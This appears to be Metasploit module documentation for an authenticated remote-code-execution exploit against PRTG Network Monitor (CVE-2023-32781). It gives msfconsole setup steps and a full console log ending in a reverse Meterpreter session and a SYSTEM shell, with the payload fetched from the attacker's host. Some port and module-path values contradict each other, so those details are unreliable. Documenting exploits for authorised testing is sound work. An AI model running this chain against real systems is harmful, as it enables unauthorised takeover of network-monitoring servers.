## Vulnerable Application

**Vulnerability Description**

This module exploits a command line parameter injection vulnerability in PRTG Network Monitor (CVE-2023-32781).

An authenticated attacker can create a HL7Sensor which can be ran with a parameter injection. This will allow the attacker to specify the `-debug` parameter which will allow a arbitrary file write on the system in the context of the user `SYSTEM`.

The module uses provided credentials to log in to the web interface, and then creates the HL7Sensor, together with an EXE/Script sensor which runs the payload. Furthermore it cleans up the sensor creation after succesful exploitation.

This vulnerability affects versions  <= 23.2.83.1760

**Vulnerable Application Installation**

PRTG provides a trial version for free (https://www.paessler.com/prtg/download) but it is always updated to the latest version, which won't allow you to test for the vulnerability.

**Successfully tested on**

- PRTG Network Monitor 23.2.83.1760 on Windows 10

## Verification Steps
1. Install the application
1. Start `msfconsole` and run the following:

```
use exploit/windows/http/prtg_authenticated_rce_cve_2023_32781
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/prtg_authenticated_rce_cve_2023_32781) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(windows/http/prtg_authenticated_rce_cve_2023_32781) > set RPORT 13380
RPORT => 13380
msf6 exploit(windows/http/prtg_authenticated_rce_cve_2023_32781) > set SRVHOST 192.168.56.1
SRVHOST => 192.168.56.1
msf6 exploit(windows/http/prtg_authenticated_rce_cve_2023_32781) > set SRVPORT 10106
SRVPORT => 10106
msf6 exploit(windows/http/prtg_authenticated_rce_cve_2023_32781) > set LPORT 4446
LPORT => 4445
msf6 exploit(windows/http/prtg_authenticated_rce_cve_2023_32781) > set LHOST 192.168.56.1
msf6 exploit(windows/http/prtg_authenticated_rce_cve_2023_32781) > exploit
```

`RHOSTS` refers to the PRTG host
`RPORT` refers to the PRTG port
`SRVHOST` refers to the host where metasploit will serve the second stage payload. This has to be reachable by `PRTG`
`SRVPORT` refers to the port where metasploit will serve the second stage payload. This has to be reachable by `PRTG`
`LPORT` refers to the payload connect port back which in this instance is meterpreter
`LHOST` refers to the payload connect host back which in this instance is meterpreter

After running this you should have a meterpreter instance


## Options
**USERNAME**

PRTG Network Monitor's account that has the right to create Sensors (allowed by default on the initial account).

**PASSWORD**

The password associated with the specified username.


## Scenarios

Running the payload and getting a meterpreter session and then spawning a shell as `nt authority\system`

```bash
msf6 > use exploit/development/cve_2023_32781
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(development/cve_2023_32781) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(development/cve_2023_32781) > set RPORT 13380
RPORT => 13380
msf6 exploit(development/cve_2023_32781) > set SRVHOST 192.168.56.1
SRVHOST => 192.168.56.1
msf6 exploit(development/cve_2023_32781) > set SRVPORT 10106
SRVPORT => 10106
msf6 exploit(development/cve_2023_32781) > set LPORT 4446
LPORT => 4445
msf6 exploit(development/cve_2023_32781) > set LHOST 192.168.56.1
msf6 exploit(development/cve_2023_32781) > exploit

[*] Started reverse TCP handler on 192.168.56.1:4446 
[*] Using URL: http://192.168.56.1:10105/sF321hmEZCz
[*] Running PRTG RCE exploit
[+] Successfully authenticated against PRTG
[*] Writing .bat to disk
[*] Extracted csrf token: OWVlYTZkYzQwYmEwNDlkZmQ5ZGJiZDQ2OWVkYWU3YTEwZjYxODE4MzM2Y2U4ZGVmZGY1OTFlNzEwOWIxNDMwMA==
[*] Generated sensor_name Wg83qiZvO
[*] Generated bat_file_name rjKu8O2Pt.bat
[+] HL7 Sensor succesfully created
[*] Sleeping 5 seconds to wait for sensor creation
[*] Fetching created sensor id
[*] Extracted sensor_id: 2095
[*] Requesting HL7 Sensor to initiate scan
[*] Extracted csrf token: OWVlYTZkYzQwYmEwNDlkZmQ5ZGJiZDQ2OWVkYWU3YTEwZjYxODE4MzM2Y2U4ZGVmZGY1OTFlNzEwOWIxNDMwMA==
[+] Sensor started running
[+] .bat file written to disk
[*] Running the .bat file: rjKu8O2Pt.bat
[*] Extracted csrf token: OWVlYTZkYzQwYmEwNDlkZmQ5ZGJiZDQ2OWVkYWU3YTEwZjYxODE4MzM2Y2U4ZGVmZGY1OTFlNzEwOWIxNDMwMA==
[*] EXE Script sensor created
[*] Sleeping 5 seconds to wait for sensor creation
[*] Fetching created sensor id
[*] Extracted sensor_id: 2096
[*] Extracted csrf token: OWVlYTZkYzQwYmEwNDlkZmQ5ZGJiZDQ2OWVkYWU3YTEwZjYxODE4MzM2Y2U4ZGVmZGY1OTFlNzEwOWIxNDMwMA==
[+] Sensor started running
[+] Exploit completed. Waiting for payload
[*] Exploit done
[*] Command Stager progress - 100.00% done (150/150 bytes)
[*] Client 192.168.56.1 (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.2428) requested /sF321hmEZCz
[*] Sending payload to 192.168.56.1 (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.2428)
[*] Sending stage (175686 bytes) to 192.168.56.1
[*] Meterpreter session 1 opened (192.168.56.1:4446 -> 192.168.56.1:43926) at 2023-11-23 17:06:34 +0000
[*] Server stopped.

meterpreter > shell
Process 4280 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22621.2428]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
whoami
nt authority\system
```
